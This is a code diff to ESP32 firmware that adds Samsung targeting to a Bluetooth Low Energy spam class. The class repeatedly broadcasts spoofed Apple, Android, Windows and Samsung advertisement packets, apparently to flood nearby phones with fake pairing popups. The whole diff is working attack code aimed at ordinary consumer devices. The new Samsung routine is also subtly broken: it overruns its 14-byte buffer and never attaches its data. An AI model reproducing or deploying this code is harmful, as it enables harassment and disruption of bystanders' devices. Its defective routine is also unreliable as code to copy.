@@ -1,7 +1,7 @@
 #include "globals.h"
 
-extern Logger l;
-extern Led led;
+extern Logger logger;
+extern Notify notify;
 
 class BLE
 {
@@ -36,7 +36,7 @@ public:
 	void advertiseApple() {
 		for (int i = 0; i < 3; i++) {
 
-			NimBLEAdvertisementData advData = getOAdvertisementData();
+			NimBLEAdvertisementData advData = getAppleAdvertisementData();
 
 			adv->setAdvertisementData(advData);
 			adv->setMinInterval(0x20);
@@ -45,7 +45,7 @@ public:
 			adv->setMaxPreferred(0x20);
 
 			adv->start();
-			led.flash();
+			notify.send();
 			delay(20);
 			adv->stop();
 		}
@@ -62,7 +62,7 @@ public:
 			adv->setMaxPreferred(0x20);
 
 			adv->start();
-			led.flash();
+			notify.send();
 			delay(20);
 			adv->stop();
 		}
@@ -79,7 +79,24 @@ public:
 			adv->setMaxPreferred(0x20);
 
 			adv->start();
-			led.flash();
+			notify.send();
+			delay(20);
+			adv->stop();
+		}
+	}
+
+	void advertiseSamsung() {
+		for (int i = 0; i < 3; i++) {
+			NimBLEAdvertisementData advData = getSamsungAdvertisementData();
+
+			adv->setAdvertisementData(advData);
+			adv->setMinInterval(0x20);
+			adv->setMaxInterval(0x20);
+			adv->setMinPreferred(0x20);
+			adv->setMaxPreferred(0x20);
+
+			adv->start();
+			notify.send();
 			delay(20);
 			adv->stop();
 		}
@@ -87,13 +104,22 @@ public:
 
 	bool t_advertise_everyone() {
 		advertise_everyone = !advertise_everyone;
-		advertise_apple, advertise_android, advertise_windows = false;
+
+		{
+			advertise_apple = false, 
+			advertise_android = false, 
+			advertise_windows = false;
+			advertise_samsung = false;
+		}
+
 		return advertise_everyone;
 	}
 
 	bool t_advertise_apple() { advertise_apple = !advertise_apple; return advertise_apple; }
 
 	bool t_advertise_android() { advertise_android = !advertise_android; return advertise_android; }
+
+	bool t_advertise_samsung() { advertise_samsung = !advertise_samsung; return advertise_samsung; }
 
 	bool t_advertise_windows() { advertise_windows = !advertise_windows; return advertise_windows; }
 
@@ -118,34 +144,38 @@ public:
 			advertiseApple();
 		if (advertise_android)
 			advertiseAndroid();
+		if (advertise_samsung)
+			advertiseSamsung();
 		if (advertise_windows)
 			advertiseWindows();
 
-		if (advertise_everyone && (last_update < millis())) {
+		if (advertise_everyone && (i_last_update < millis())) {
 			advertiseApple();
 			advertiseAndroid();
 			advertiseWindows();
+			advertiseSamsung();
 		}
 
-		if (last_update < millis())
-			last_update = millis() + 1000;
+		if (i_last_update < millis())
+			i_last_update = millis() + 1000;
 	}
 public:
 	bool advertise_everyone = false;
 	bool advertise_apple = false;
 	bool advertise_android = false;
+	bool advertise_samsung = false;
 	bool advertise_windows = false;
 
 private:
 	NimBLEAdvertising *adv;
 	NimBLEServer *server;
-	int last_update = 0;
+	int i_last_update = 0;
 	int circle_size = 0;
 
 	/**
 	 * Credits https://github.com/RapierXbox/ESP32-Sour-Apple
 	 */
-	NimBLEAdvertisementData getOAdvertisementData() {
+	NimBLEAdvertisementData getAppleAdvertisementData() {
 		NimBLEAdvertisementData oAdvertisementData = NimBLEAdvertisementData();
 		uint8_t packet[17];
 		uint8_t i = 0;
@@ -223,6 +253,44 @@ private:
 		packet[i++] = (rand() % 120) - 100; // -100 to +20 dBm
 
 		oAdvertisementData.addData(std::string((char *)packet, 14));
+		return oAdvertisementData;
+	}
+
+	NimBLEAdvertisementData getSamsungAdvertisementData() {
+		NimBLEAdvertisementData oAdvertisementData = NimBLEAdvertisementData();
+		uint8_t packet[14];
+		uint8_t i = 0;
+
+		packet[i++] = 14;	// Packet Length
+		packet[i++] = 0xFF; // AD Type (Manufacturer Specific)
+		packet[i++] = 0x75; // Company ID (Samsung Electronics Co. Ltd.)
+		
+		packet[i++] = 0x00; 
+		packet[i++] = 0x01; 
+		packet[i++] = 0x00; 
+		packet[i++] = 0x02; 
+		packet[i++] = 0x00; 
+		packet[i++] = 0x01; 
+		packet[i++] = 0x00; 
+		packet[i++] = 0xFF; 
+		packet[i++] = 0x00; 
+		packet[i++] = 0x00;
+		packet[i++] = 0x43;
+
+		const uint32_t model = samsum_models[rand() % samsum_models_count].value; // Action Type
+
+		packet[i++] = (model >> 0x00) & 0xFF;
+		/*
+		packet[i++] = (model >> 0x08) & 0xFF;
+		packet[i++] = (model >> 0x00) & 0xFF;
+		
+		packet[i++] = 2; // Size
+		packet[i++] = 0x0A; // AD Type (Tx Power Level)
+		packet[i++] = (rand() % 120) - 100; // -100 to +20 dBm
+
+		oAdvertisementData.addData(std::string((char *)packet, 14));
+		
+		*/
 		return oAdvertisementData;
 	}
 };
